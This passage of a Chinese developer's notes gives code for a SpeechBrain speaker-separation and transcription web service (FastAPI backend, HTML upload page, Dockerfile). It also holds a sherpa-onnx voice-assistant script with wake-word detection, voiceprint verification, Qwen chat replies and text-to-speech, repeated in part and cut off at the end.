os.makedirs(\u0026#34;uploads\u0026#34;, exist_ok=True) os.makedirs(\u0026#34;separated\u0026#34;, exist_ok=True) file_path = f\u0026#34;uploads/{file.filename}\u0026#34; with open(file_path, \u0026#34;wb\u0026#34;) as f: shutil.copyfileobj(file.file, f) waveform, sample_rate = torchaudio.load(file_path) target_sr = sep_model.hparams.sample_rate if hasattr(sep_model.hparams, \u0026#34;sample_rate\u0026#34;) else sample_rate if sample_rate != target_sr: resampler = T.Resample(orig_freq=sample_rate, new_freq=target_sr) waveform = resampler(waveform) sample_rate = target_sr tmp_path = \u0026#34;uploads/temp_resampled.wav\u0026#34; torchaudio.save(tmp_path, waveform, sample_rate) else: tmp_path = file_path est_sources = sep_model.separate_file(path=tmp_path) num_speakers = est_sources.shape[2] results = [] for i in range(num_speakers): speaker_wav = f\u0026#34;separated/{file.filename}_speaker_{i+1}.wav\u0026#34; torchaudio.save(speaker_wav, est_sources[:, :, i].detach().cpu(), sample_rate) transcription = asr_model.transcribe_file(speaker_wav) results.append({ \u0026#34;speaker\u0026#34;: i + 1, \u0026#34;transcript\u0026#34;: transcription }) if tmp_path != file_path: os.remove(tmp_path) return JSONResponse(content={\u0026#34;num_speakers\u0026#34;: num_speakers, \u0026#34;results\u0026#34;: results}) static/index.html\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;zh-CN\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;多说话人分离及语音识别\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; body { font-family: Arial, sans-serif; margin: 2rem; } button { padding: 0.5rem 1rem; margin-top: 0.5rem; } #results { margin-top: 1rem; white-space: pre-wrap; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h2\u0026gt;上传混合音频，自动分离并转写\u0026lt;/h2\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; id=\u0026#34;audioFile\u0026#34; accept=\u0026#34;.wav,.mp3\u0026#34; /\u0026gt; \u0026lt;br /\u0026gt; \u0026lt;button onclick=\u0026#34;upload()\u0026#34;\u0026gt;上传识别\u0026lt;/button\u0026gt; \u0026lt;div id=\u0026#34;results\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; async function upload() { const fileInput = document.getElementById(\u0026#34;audioFile\u0026#34;); if (!fileInput.files.length) { alert(\u0026#34;请选择音频文件！\u0026#34;); return; } const file = fileInput.files[0]; const formData = new FormData(); formData.append(\u0026#34;file\u0026#34;, file); const resultsDiv = document.getElementById(\u0026#34;results\u0026#34;); resultsDiv.textContent = \u0026#34;识别中，请稍候...\u0026#34;; try { const response = await fetch(\u0026#34;/upload/\u0026#34;, { method: \u0026#34;POST\u0026#34;, body: formData }); if (!response.ok) throw new Error(\u0026#34;上传失败\u0026#34;); const data = await response.json(); let text = `检测到说话人数：${data.num_speakers}\\n\\n`; data.results.forEach(r =\u0026gt; { text += `说话人 ${r.speaker}:\\n${r.transcript}\\n\\n`; }); resultsDiv.textContent = text; } catch (err) { resultsDiv.textContent = \u0026#34;错误：\u0026#34; + err.message; } } \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; requirements.txt\nfastapi uvicorn speechbrain torchaudio python-multipart Dockerfile\n# 基础镜像：官方 PyTorch 镜像（带 CUDA 也可以） FROM pytorch/pytorch:2.0.1-cuda11.7-cudnn8-runtime # 设置工作目录 WORKDIR /app # 复制依赖文件和程序 COPY requirements.txt . COPY app.py . COPY static ./static # 安装依赖 RUN pip install --upgrade pip RUN pip install -r requirements.txt # 运行端口 EXPOSE 8000 # 启动命令 CMD [\u0026#34;uvicorn\u0026#34;, \u0026#34;app:app\u0026#34;, \u0026#34;--host\u0026#34;, \u0026#34;0.0.0.0\u0026#34;, \u0026#34;--port\u0026#34;, \u0026#34;8000\u0026#34;] 启动与调试 本地调试：\npip install -r requirements.txt uvicorn app:app --reload --host 0.0.0.0 --port 8000 浏览器打开 http://localhost:8000 上传音频测试。\nDocker 构建启动：\ndocker build -t speechbrain-stt . docker run -p 8000:8000 speechbrain-stt 访问 http://localhost:8000\n扩展 前端做音频播放分离音频文件功能（接口返回的 wav 文件路径）\n后端改用异步队列（如 Celery + Redis）处理分离和识别，提升吞吐\n支持多种音频格式上传，后台自动转换成 wav\n部署时配置 HTTPS，防止数据明文传输\n加入身份验证保护接口，防止滥用\n中文识别模型 asr-wav2vec2-commonvoice-14-zh-CN from speechbrain.inference.ASR import EncoderASR m = EncoderASR.from_hparams(source=\u0026#34;speechbrain/asr-wav2vec2-commonvoice-14-zh-CN\u0026#34;, savedir=\u0026#34;tmp\u0026#34;) print(m.transcribe_file(\u0026#34;separated/speaker_1.wav\u0026#34;)) Whisper from faster_whisper import WhisperModel m = WhisperModel(\u0026#34;small\u0026#34;, device=\u0026#34;cpu\u0026#34;) segments, info = m.transcribe(\u0026#34;separated/xxx_speaker_1.wav\u0026#34;, beam_size=5, language=\u0026#34;zh\u0026#34;) print(\u0026#34;\u0026#34;.join([s.text for s in segments])) 结果：\n[ctranslate2] [thread 460025] [warning] The compute type inferred from the saved model is float16, but the target device or backend do not support efficient float16 computation. The model weights have been automatically converted to use the float32 compute type instead. 哈喽哈喽李华李华 SpeechBrain \u0026amp; TTS SpeechBrain 分离模型\n#!/usr/bin/env python3 # -*- coding: utf-8 -*- import argparse import sys import os import json from pathlib import Path import numpy as np import sherpa_onnx import sounddevice as sd import threading import queue import time from collections import defaultdict import soundfile as sf from typing import Dict, List, Optional, Tuple from pypinyin import lazy_pinyin from fuzzywuzzy import fuzz import torch from transformers import AutoTokenizer, AutoModelForCausalLM import resampy # 用于重采样 # ========== 新增：SpeechBrain 分离相关 ========== from speechbrain.inference import SepformerSeparation as separator import torchaudio.transforms as T # ------------------ 路径工具 ------------------ current_dir = os.path.dirname(os.path.abspath(__file__)) parent_dir = os.path.dirname(current_dir) def get_relative_path(relative_path: str) -\u0026gt; str: return os.path.join(parent_dir, relative_path) # ------------------ 加载关键词配置 ------------------ def load_keywords() -\u0026gt; Dict[str, int]: keywords_file = get_relative_path(\u0026#34;/root/room/keywords.json\u0026#34;) if not os.path.exists(keywords_file): raise FileNotFoundError(f\u0026#34;未找到关键词文件: {keywords_file}\u0026#34;) with open(keywords_file, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: return json.load(f) KEYWORD2ID = load_keywords() def fuzzy_match(text: str) -\u0026gt; Tuple[Optional[str], int]: txt_py = \u0026#34;\u0026#34;.join(lazy_pinyin(text)) for kw, kid in KEYWORD2ID.items(): if fuzz.partial_ratio(\u0026#34;\u0026#34;.join(lazy_pinyin(kw)), txt_py) \u0026gt;= 70: return kw, kid return None, 0 # ------------------ 加载 system prompt ------------------ def load_system_prompt() -\u0026gt; str: prompt_file = get_relative_path(\u0026#34;/root/room/system_prompt.txt\u0026#34;) if not os.path.exists(prompt_file): raise FileNotFoundError(f\u0026#34;未找到 system prompt 文件: {prompt_file}\u0026#34;) with open(prompt_file, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: return f.read().strip() SYSTEM_PROMPT = load_system_prompt() # ------------------ 大模型初始化 ------------------ QWEN_PATH = get_relative_path(\u0026#34;/root/room/models/qwen2.5-0.5b\u0026#34;) tok = AutoTokenizer.from_pretrained(QWEN_PATH, trust_remote_code=True) chat_model = AutoModelForCausalLM.from_pretrained( \u0026#34;Qwen/Qwen2.5-0.5B\u0026#34;, cache_dir=\u0026#34;/root/room/models\u0026#34;, torch_dtype=\u0026#34;auto\u0026#34;, device_map=\u0026#34;auto\u0026#34; ) def qwen_chat(prompt: str) -\u0026gt; str: msgs = [ {\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: SYSTEM_PROMPT}, {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: prompt} ] text = tok.apply_chat_template(msgs, tokenize=False, add_generation_prompt=True) inputs = tok(text, return_tensors=\u0026#34;pt\u0026#34;) with torch.no_grad(): out = chat_model.generate( **inputs, max_new_tokens=64, do_sample=True, temperature=0.7, pad_token_id=tok.eos_token_id ) raw_output = tok.decode(out[0][len(inputs.input_ids[0]):], skip_special_tokens=True).strip() for token in [\u0026#34;\u0026lt;/s\u0026gt;\u0026#34;, \u0026#34;\u0026lt;/user\u0026gt;\u0026#34;, \u0026#34;.user\u0026#34;, \u0026#34;🤨\u0026#34;, \u0026#34;## 128000\u0026#34;, \u0026#34;\\x0c\u0026#34;]: raw_output = raw_output.replace(token, \u0026#34;\u0026#34;) reply = raw_output.split(\u0026#34;\\n\u0026#34;)[0].strip() return reply # ------------------ 声纹相关 ------------------ def load_speaker_embedding_model(model_path: str): config = sherpa_onnx.SpeakerEmbeddingExtractorConfig( model=model_path, num_threads=1, debug=False, provider=\u0026#34;cpu\u0026#34;, ) if not config.validate(): raise ValueError(f\u0026#34;Invalid config. {config}\u0026#34;) return sherpa_onnx.SpeakerEmbeddingExtractor(config) def load_speaker_file(speaker_file_path: str) -\u0026gt; Dict[str, List[str]]: ans = defaultdict(list) with open(speaker_file_path) as f: for line in f: line = line.strip() if not line: continue fields = line.split() if len(fields) != 2: raise ValueError(f\u0026#34;Invalid line: {line}\u0026#34;) speaker_name, filename = fields ans[speaker_name].append(filename) return ans def compute_speaker_embedding(filenames: List[str], extractor) -\u0026gt; np.ndarray: ans = None for filename in filenames: samples, sr = sf.read(filename, always_2d=True, dtype=\u0026#34;float32\u0026#34;) samples = samples[:, 0] samples = np.ascontiguousarray(samples) stream = extractor.create_stream() stream.accept_waveform(sr, samples) stream.input_finished() embedding = np.array(extractor.compute(stream)) if ans is None: ans = embedding else: ans += embedding return ans / len(filenames) def init_speaker_identification(): speaker_model = get_relative_path(\u0026#34;/root/room/wespeaker_zh_cnceleb_resnet34.onnx\u0026#34;) speaker_file = get_relative_path(\u0026#34;/root/room/speaker.txt\u0026#34;) extractor = load_speaker_embedding_model(speaker_model) speaker_data = load_speaker_file(speaker_file) manager = sherpa_onnx.SpeakerEmbeddingManager(extractor.dim) for name, filelist in speaker_data.items(): emb = compute_speaker_embedding(filelist, extractor) status = manager.add(name, emb) if not status: raise RuntimeError(f\u0026#34;Failed to register speaker {name}\u0026#34;) return extractor, manager def wake_word_detection_with_speaker(input_device: int, input_sr: int, extractor, speaker_manager) -\u0026gt; Optional[str]: kws_dir = get_relative_path(\u0026#34;/root/room/sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01\u0026#34;) keyword_spotter = sherpa_onnx.KeywordSpotter( tokens=os.path.join(kws_dir, \u0026#34;tokens.txt\u0026#34;), encoder=os.path.join(kws_dir, \u0026#34;encoder-epoch-12-avg-2-chunk-16-left-64.int8.onnx\u0026#34;), decoder=os.path.join(kws_dir, \u0026#34;decoder-epoch-12-avg-2-chunk-16-left-64.int8.onnx\u0026#34;), joiner=os.path.join(kws_dir, \u0026#34;joiner-epoch-99-avg-1-chunk-16-left-64.int8.onnx\u0026#34;), num_threads=1, max_active_paths=4, keywords_file=os.path.join(kws_dir, \u0026#34;keywords.txt\u0026#34;), keywords_score=1.0, keywords_threshold=0.25, num_trailing_blanks=1, provider=\u0026#34;cpu\u0026#34;, ) print(\u0026#34;等待唤醒词（需声纹匹配）...\u0026#34;) stream = keyword_spotter.create_stream() chunk = int(0.1 * input_sr) buffer_seconds = 2.0 # 缓存唤醒词语音用于声纹识别 max_buffer_len = int(buffer_seconds * input_sr) audio_buffer = np.zeros((0,), dtype=np.float32) with sd.InputStream(device=input_device, channels=1, dtype=\u0026#34;float32\u0026#34;, samplerate=input_sr) as s: while True: samples, _ = s.read(chunk) samples = samples.reshape(-1) stream.accept_waveform(input_sr, samples) # 语音缓存 audio_buffer = np.concatenate((audio_buffer, samples)) if len(audio_buffer) \u0026gt; max_buffer_len: audio_buffer = audio_buffer[-max_buffer_len:] while keyword_spotter.is_ready(stream): keyword_spotter.decode_stream(stream) result = keyword_spotter.get_result(stream) if result: print(f\u0026#34;检测到唤醒词: {result}\u0026#34;) keyword_spotter.reset_stream(stream) # 进行声纹识别 print(\u0026#34;正在进行声纹识别验证...\u0026#34;) audio = np.ascontiguousarray(audio_buffer) emb_stream = extractor.create_stream() emb_stream.accept_waveform(input_sr, audio) emb_stream.input_finished() emb = np.array(extractor.compute(emb_stream)) speaker = speaker_manager.search(emb, threshold=0.6) if speaker: print(f\u0026#34;声纹识别成功，说话人: {speaker}\u0026#34;) return speaker else: print(\u0026#34;声纹识别失败，忽略本次唤醒\u0026#34;) return None # ------------------ 唤醒词（不带声纹，仅示例备用） ------------------ def wake_word_detection(input_device: int, input_sr: int) -\u0026gt; bool: kws_dir = get_relative_path(\u0026#34;/root/room/sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01\u0026#34;) keyword_spotter = sherpa_onnx.KeywordSpotter( tokens=os.path.join(kws_dir, \u0026#34;tokens.txt\u0026#34;), encoder=os.path.join(kws_dir, \u0026#34;encoder-epoch-12-avg-2-chunk-16-left-64.int8.onnx\u0026#34;), decoder=os.path.join(kws_dir, \u0026#34;decoder-epoch-12-avg-2-chunk-16-left-64.int8.onnx\u0026#34;), joiner=os.path.join(kws_dir, \u0026#34;joiner-epoch-99-avg-1-chunk-16-left-64.int8.onnx\u0026#34;), num_threads=1, max_active_paths=4, keywords_file=os.path.join(kws_dir, \u0026#34;keywords.txt\u0026#34;), keywords_score=1.0, keywords_threshold=0.25, num_trailing_blanks=1, provider=\u0026#34;cpu\u0026#34;, ) print(\u0026#34;等待唤醒词...\u0026#34;) stream = keyword_spotter.create_stream() chunk = int(0.1 * input_sr) with sd.InputStream(device=input_device, channels=1, dtype=\u0026#34;float32\u0026#34;, samplerate=input_sr) as s: while True: samples, _ = s.read(chunk) samples = samples.reshape(-1) stream.accept_waveform(input_sr, samples) while keyword_spotter.is_ready(stream): keyword_spotter.decode_stream(stream) result = keyword_spotter.get_result(stream) if result: print(f\u0026#34;检测到唤醒词: {result}\u0026#34;) keyword_spotter.reset_stream(stream) return True # ------------------ 语音识别（保留原有函数可按需使用） ------------------ def speech_recognition(extractor, speaker_manager, input_device: int, input_sr: int) -\u0026gt; Tuple[str, str]: target_sr = 16000 # VAD/ASR 采样率 recognizer = sherpa_onnx.OfflineRecognizer.from_paraformer( paraformer=get_relative_path(\u0026#34;/root/room/sherpa-onnx-paraformer-zh-2023-03-28/model.int8.onnx\u0026#34;), tokens=get_relative_path(\u0026#34;/root/room/sherpa-onnx-paraformer-zh-2023-03-28/tokens.txt\u0026#34;), num_threads=1, sample_rate=target_sr, feature_dim=80, decoding_method=\u0026#34;greedy_search\u0026#34;, debug=False, ) vad_config = sherpa_onnx.VadModelConfig() vad_config.silero_vad.model = get_relative_path(\u0026#34;/root/room/silero_vad.onnx\u0026#34;) vad_config.silero_vad.min_silence_duration = 0.5 vad_config.silero_vad.min_speech_duration = 0.5 vad_config.sample_rate = target_sr vad = sherpa_onnx.VoiceActivityDetector(vad_config, buffer_size_in_seconds=100) window_size = vad_config.silero_vad.window_size print(\u0026#34;请说出您的指令...\u0026#34;) chunk = int(0.1 * input_sr) audio_buffer = np.array([], dtype=\u0026#34;float32\u0026#34;) with sd.InputStream(device=input_device, channels=1, dtype=\u0026#34;float32\u0026#34;, samplerate=input_sr) as s: while True: samples, _ = s.read(chunk) samples = samples.reshape(-1) resampled = resampy.resample(samples, input_sr, target_sr) audio_buffer = np.concatenate([audio_buffer, resampled]) while len(audio_buffer) \u0026gt; window_size: vad.accept_waveform(audio_buffer[:window_size]) audio_buffer = audio_buffer[window_size:] while not vad.empty(): if len(vad.front.samples) \u0026lt; 0.5 * target_sr: vad.pop() continue stream = extractor.create_stream() stream.accept_waveform(target_sr, vad.front.samples) stream.input_finished() emb = np.array(extractor.compute(stream)) speaker = speaker_manager.search(emb, threshold=0.6) or \u0026#34;unknown\u0026#34; asr_stream = recognizer.create_stream() asr_stream.accept_waveform(target_sr, vad.front.samples) recognizer.decode_stream(asr_stream) text = asr_stream.result.text.strip() vad.pop() return text, speaker # ------------------ TTS ------------------ buffer = queue.Queue() started = False stopped = False killed = False event = threading.Event() tts_sr = 24000 output_sr = 48000 def generated_audio_callback(samples: np.ndarray, progress: float) -\u0026gt; int: global started resampled = resampy.resample(samples, tts_sr, output_sr) buffer.put(resampled) if not started: started = True return 0 if killed else 1 def play_audio_callback(outdata: np.ndarray, frames: int, time, status): if killed or (started and buffer.empty() and stopped): event.set() if buffer.empty(): outdata.fill(0) return n = 0 while n \u0026lt; frames and not buffer.empty(): remaining = frames - n k = buffer.queue[0].shape[0] if remaining \u0026lt;= k: outdata[n:, 0] = buffer.queue[0][:remaining] buffer.queue[0] = buffer.queue[0][remaining:] n = frames if buffer.queue[0].shape[0] == 0: buffer.get() break outdata[n:n + k, 0] = buffer.get() n += k if n \u0026lt; frames: outdata[n:, 0] = 0 def tts_synthesis(text: str, output_device: int): global tts_sr, started, stopped tts_config = sherpa_onnx.OfflineTtsConfig( model=sherpa_onnx.OfflineTtsModelConfig( vits=sherpa_onnx.OfflineTtsVitsModelConfig( model=get_relative_path(\u0026#34;/root/room/vits-piper-zh_CN-huayan-medium/zh_CN-huayan-medium.onnx\u0026#34;), tokens=get_relative_path(\u0026#34;/root/room/vits-piper-zh_CN-huayan-medium/tokens.txt\u0026#34;), data_dir=get_relative_path(\u0026#34;/root/room/vits-piper-zh_CN-huayan-medium/espeak-ng-data\u0026#34;), ), provider=\u0026#34;cpu\u0026#34;, debug=False, num_threads=1, ), max_num_sentences=1, ) tts = sherpa_onnx.OfflineTts(tts_config) tts_sr = tts.sample_rate threading.Thread(target=lambda: sd.OutputStream( device=output_device, channels=1, callback=play_audio_callback, dtype=\u0026#34;float32\u0026#34;, samplerate=output_sr, blocksize=1024 ).start()).start() event.clear() started = False stopped = False tts.generate(text, sid=0, speed=1, callback=generated_audio_callback) stopped = True event.wait() # ------------------ SpeechBrain 分离：初始化与工具函数 ------------------ print(\u0026#34;初始化 SpeechBrain 分离模型（Sepformer）... 这可能需要下载模型到 pretrained_models/sepformer-wsj02mix\u0026#34;) try: sep_model = separator.from_hparams( source=\u0026#34;speechbrain/sepformer-wsj02mix\u0026#34;, savedir=\u0026#34;pretrained_models/sepformer-wsj02mix\u0026#34;, run_opts={\u0026#34;device\u0026#34;: \u0026#34;cpu\u0026#34;}, ) SEP_SR = getattr(sep_model.hparams, \u0026#34;sample_rate\u0026#34;, 8000) # 通常 sepformer 用 8k print(f\u0026#34;Sepformer 采样率: {SEP_SR}\u0026#34;) except Exception as e: print(\u0026#34;加载 Sepformer 模型失败:\u0026#34;, e) sep_model = None SEP_SR = 8000 # 我们的 ASR / 声纹 统一用 16k（与 原逻辑一致） ASR_SR = 16000 MIN_AUDIO_SECONDS = 0.3 # 跳过太短片段（秒） MIN_AUDIO_SAMPLES = int(MIN_AUDIO_SECONDS * ASR_SR) def _extract_sources_from_sep_output(est_np: np.ndarray, max_sources=16) -\u0026gt; List[np.ndarray]: \u0026#34;\u0026#34;\u0026#34; 将 sep_model 输出 ndarray 转为 [n_src, time] 的 list（numpy 1D float32）。 尽量自动识别哪个轴是源、哪个轴是时间。 \u0026#34;\u0026#34;\u0026#34; if est_np is None: return [] if est_np.ndim == 1: return [] # 先尝试找到较小的轴（\u0026gt;1 且 \u0026lt;= max_sources）作为 source 轴 src_axis = None time_axis = None for i, s in enumerate(est_np.shape): if 1 \u0026lt; s \u0026lt;= max_sources: src_axis = i if s \u0026gt; 1000: time_axis = i if src_axis is None: # 退化策略：2D 情况下，较小维度当作 src if est_np.ndim == 2: if est_np.shape[0] \u0026lt; est_np.shape[1]: src_axis, time_axis = 0, 1 else: src_axis, time_axis = 1, 0 elif est_np.ndim == 3: # 常见： (1, n_src, time) 或 (channels, time, n_src) # 优先选 size 小的轴作为 src sizes = list(est_np.shape) min_idx = int(np.argmin(sizes)) # 保证不是 time axis src_axis = min_idx # time axis 取最大轴 time_axis = int(np.argmax(sizes)) else: # 最保守策略 src_axis = 0 time_axis = est_np.ndim - 1 if time_axis is None: time_axis = max(range(est_np.ndim), key=lambda i: est_np.shape[i] if i != src_axis else -1) # 将 array 重新排列为 (src, time, ...) # 我们把 time 移到 axis=1，src 移到 axis=0 arr = np.moveaxis(est_np, (src_axis, time_axis), (0, 1)) # 现在 arr.shape[0] = n_src, arr.shape[1] = time n_src = arr.shape[0] sources = [] for i in range(n_src): s = arr[i] # 若还有额外轴（如 channels），把它们 flatten 或取第一通道 if s.ndim \u0026gt; 1: # 把多通道求均值为单通道 s = np.mean(s, axis=tuple(range(1, s.ndim))) sources.append(s.astype(np.float32).reshape(-1)) return sources def separate_speakers(mixed_audio: np.ndarray, input_sr: int) -\u0026gt; List[np.ndarray]: \u0026#34;\u0026#34;\u0026#34; 返回 list，每项为以 SEP_SR 为采样率的 numpy 1D float32 信号（单通道）。 （后续处理会把它重采样为 ASR_SR） \u0026#34;\u0026#34;\u0026#34; if sep_model is None: print(\u0026#34;Sepformer 未初始化，跳过分离，直接返回原始音频\u0026#34;) return [mixed_audio] # 准备模型输入：sep_model 要求的形状可能是 [batch, time] 或 [batch, 1, time] 等 # 我们统一提供 [1, time] if input_sr != SEP_SR: # 用 resampy 将输入混音重采样到 sep 模型采样率 mixed_audio_sep = resampy.resample(mixed_audio, input_sr, SEP_SR).astype(np.float32) else: mixed_audio_sep = mixed_audio.astype(np.float32) audio_tensor = torch.from_numpy(mixed_audio_sep).float().unsqueeze(0) # [1, time] with torch.no_grad(): est = sep_model.separate_batch(audio_tensor) # 返回 tensor，shape 可能多样 est_np = est.cpu().numpy() sources = _extract_sources_from_sep_output(est_np, max_sources=16) # 过滤极短或静音的源（避免后续造成 extractor 报错） filtered = [] for i, s in enumerate(sources): if s is None or s.size == 0: continue power = float(np.mean(np.abs(s))) if s.shape[0] \u0026lt; 10: # 非常短 continue # 过滤非常静的（阈值可根据实际调整） if power \u0026lt; 1e-5: continue filtered.append(s) return filtered # ------------------ 主流程相关（设备选择 / 录音） ------------------ def select_devices(): print(\u0026#34;=== 可用输入输出设备列表 ===\u0026#34;) print(sd.query_devices()) input_device = int(input(\u0026#34;请输入输入设备ID: \u0026#34;)) output_device = int(input(\u0026#34;请输入输出设备ID: \u0026#34;)) input_info = sd.query_devices(input_device) output_info = sd.query_devices(output_device) input_sr = int(input_info[\u0026#39;default_samplerate\u0026#39;]) print(f\u0026#34;选择输入采样率: {input_sr} Hz\u0026#34;) return input_device, output_device, input_sr def record_mixed_audio(input_device: int, input_sr: int, duration: float = 5.0): \u0026#34;\u0026#34;\u0026#34;从麦克风录制一段混合音频（单声道 float32）\u0026#34;\u0026#34;\u0026#34; print(f\u0026#34;开始录音 {duration} 秒...\u0026#34;) with sd.InputStream(device=input_device, channels=1, dtype=\u0026#34;float32\u0026#34;, samplerate=input_sr) as s: frames = [] total_chunks = int(duration / 0.1) for _ in range(total_chunks): samples, _ = s.read(int(0.1 * input_sr)) frames.append(samples.reshape(-1)) mixed_audio = np.concatenate(frames).astype(np.float32) print(\u0026#34;录音完成\u0026#34;) return mixed_audio # ------------------ 主流程 ------------------ def main(): global killed try: print(\u0026#34;初始化声纹识别...\u0026#34;) extractor, speaker_manager = init_speaker_identification() input_device, output_device, input_sr = select_devices() # 预创建 ASR recognizer（避免在每个说话人上重复创建） recognizer = sherpa_onnx.OfflineRecognizer.from_paraformer( paraformer=get_relative_path(\u0026#34;/root/room/sherpa-onnx-paraformer-zh-2023-03-28/model.int8.onnx\u0026#34;), tokens=get_relative_path(\u0026#34;/root/room/sherpa-onnx-paraformer-zh-2023-03-28/tokens.txt\u0026#34;), num_threads=1, sample_rate=ASR_SR, feature_dim=80, decoding_method=\u0026#34;greedy_search\u0026#34;, debug=False, ) speaker = wake_word_detection_with_speaker(input_device, input_sr, extractor, speaker_manager) if speaker: # 1) 录制混合音频 mixed_audio = record_mixed_audio(input_device, input_sr, duration=5.0) # 2) 分离 separated = separate_speakers(mixed_audio, input_sr) print(f\u0026#34;分离后有效说话人数量: {len(separated)}\u0026#34;) if len(separated) == 0: print(\u0026#34;未检测到有效分离结果，回退为直接识别整段语音\u0026#34;) # 回退：把混合音频重采样到 ASR_SR 并识别 mixed_resampled = resampy.resample(mixed_audio, input_sr, ASR_SR).astype(np.float32) # 声纹与识别（与单路流程相同） if mixed_resampled.size \u0026gt;= MIN_AUDIO_SAMPLES: try: emb_stream = extractor.create_stream() emb_stream.accept_waveform(ASR_SR, mixed_resampled) emb_stream.input_finished() emb = np.array(extractor.compute(emb_stream)) spk_name = speaker_manager.search(emb, threshold=0.6) or \u0026#34;unknown\u0026#34; except Exception as e: print(\u0026#34;声纹识别失败:\u0026#34;, e) spk_name = \u0026#34;unknown\u0026#34; try: asr_stream = recognizer.create_stream() asr_stream.accept_waveform(ASR_SR, mixed_resampled) recognizer.decode_stream(asr_stream) text = asr_stream.result.text.strip() except Exception as e: print(\u0026#34;ASR 失败:\u0026#34;, e) text = \u0026#34;\u0026#34; print(f\u0026#34;识别结果: {text} (说话人: {spk_name})\u0026#34;) keyword, kid = fuzzy_match(text) if keyword: reply = f\u0026#34;已为您操作【{keyword}】，编号{kid}\u0026#34; else: reply = qwen_chat(text) print(\u0026#34;回复:\u0026#34;, reply) tts_synthesis(reply, output_device) else: print(\u0026#34;录音过短，无法识别。\u0026#34;) return # 3) 对每一路分别做 声纹 -\u0026gt; ASR -\u0026gt; reply -\u0026gt; TTS for i, sp_audio_sep in enumerate(separated): print(f\u0026#34;\\n=== 处理第 {i+1} 个说话人 ===\u0026#34;) # 先把 sep 模型的采样率转换到 ASR_SR（如果 sep 模型采样率不同） if SEP_SR != ASR_SR: try: sp_audio = resampy.resample(sp_audio_sep, SEP_SR, ASR_SR).astype(np.float32) except Exception as e: print(\u0026#34;重采样出错，跳过该说话人:\u0026#34;, e) continue else: sp_audio = sp_audio_sep.astype(np.float32) # 过滤太短或静音 if sp_audio.size \u0026lt; MIN_AUDIO_SAMPLES: print(f\u0026#34;第 {i+1} 路音频过短（{sp_audio.size} samples），跳过\u0026#34;) continue if float(np.mean(np.abs(sp_audio))) \u0026lt; 1e-5: print(f\u0026#34;第 {i+1} 路音频过静，跳过\u0026#34;) continue # 声纹识别（保护性 try） try: emb_stream = extractor.create_stream() emb_stream.accept_waveform(ASR_SR, sp_audio) emb_stream.input_finished() emb = np.array(extractor.compute(emb_stream)) spk_name = speaker_manager.search(emb, threshold=0.6) or \u0026#34;unknown\u0026#34; except Exception as e: print(\u0026#34;声纹识别出错（跳过声纹或标为 unknown）:\u0026#34;, e) spk_name = \u0026#34;unknown\u0026#34; # ASR try: asr_stream = recognizer.create_stream() asr_stream.accept_waveform(ASR_SR, sp_audio) recognizer.decode_stream(asr_stream) text = asr_stream.result.text.strip() except Exception as e: print(\u0026#34;ASR 失败:\u0026#34;, e) text = \u0026#34;\u0026#34; print(f\u0026#34;识别结果: {text} (说话人: {spk_name})\u0026#34;) # 生成回复并 TTS keyword, kid = fuzzy_match(text) if keyword: reply = f\u0026#34;已为您操作【{keyword}】，编号{kid}\u0026#34; else: reply = qwen_chat(text) if text.strip() else \u0026#34;抱歉，我没有听清楚。\u0026#34; print(\u0026#34;回复:\u0026#34;, reply) tts_synthesis(reply, output_device) except KeyboardInterrupt: killed = True print(\u0026#34;\\n程序已终止\u0026#34;) sys.exit(0) if __name__ == \u0026#34;__main__\u0026#34;: main() TTS线程优化 调用都复用同一个流来播放\n#!/usr/bin/env python3 # -*- coding: utf-8 -*- import argparse import sys import os import json from pathlib import Path import numpy as np import sherpa_onnx import sounddevice as sd import threading import queue import time from collections import defaultdict import soundfile as sf from typing import Dict, List, Optional, Tuple from pypinyin import lazy_pinyin from fuzzywuzzy import fuzz import torch from transformers import AutoTokenizer, AutoModelForCausalLM import resampy # 用于重采样 # ========== 新增：SpeechBrain 分离相关 ========== from speechbrain.inference import SepformerSeparation as separator import torchaudio.transforms as T # ------------------ 路径工具 ------------------ current_dir = os.path.dirname(os.path.abspath(__file__)) parent_dir = os.path.dirname(current_dir) def get_relative_path(relative_path: str) -\u0026gt; str: return os.path.join(parent_dir, relative_path) # ------------------ 加载关键词配置 ------------------ def load_keywords() -\u0026gt; Dict[str, int]: keywords_file = get_relative_path(\u0026#34;/root/room/keywords.json\u0026#34;) if not os.path.exists(keywords_file): raise FileNotFoundError(f\u0026#34;未找到关键词文件: {keywords_file}\u0026#34;) with open(keywords_file, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: return json.load(f) KEYWORD2ID = load_keywords() def fuzzy_match(text: str) -\u0026gt; Tuple[Optional[str], int]: txt_py = \u0026#34;\u0026#34;.join(lazy_pinyin(text)) for kw, kid in KEYWORD2ID.items(): if fuzz.partial_ratio(\u0026#34;\u0026#34;.join(lazy_pinyin(kw)), txt_py) \u0026gt;= 70: return kw, kid return None, 0 # ------------------ 加载 system prompt ------------------ def load_system_prompt() -\u0026gt; str: prompt_file = get_relative_path(\u0026#34;/root/room/system_prompt.txt\u0026#34;) if not os.path.exists(prompt_file): raise FileNotFoundError(f\u0026#34;未找到 system prompt 文件: {prompt_file}\u0026#34;) with open(prompt_file, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: return f.read().strip() SYSTEM_PROMPT = load_system_prompt() # ------------------ 大模型初始化 ------------------ QWEN_PATH = get_relative_path(\u0026#34;/root/room/models/qwen2.5-0.5b\u0026#34;) tok = AutoTokenizer.from_pretrained(QWEN_PATH, trust_remote_code=True) chat_model = 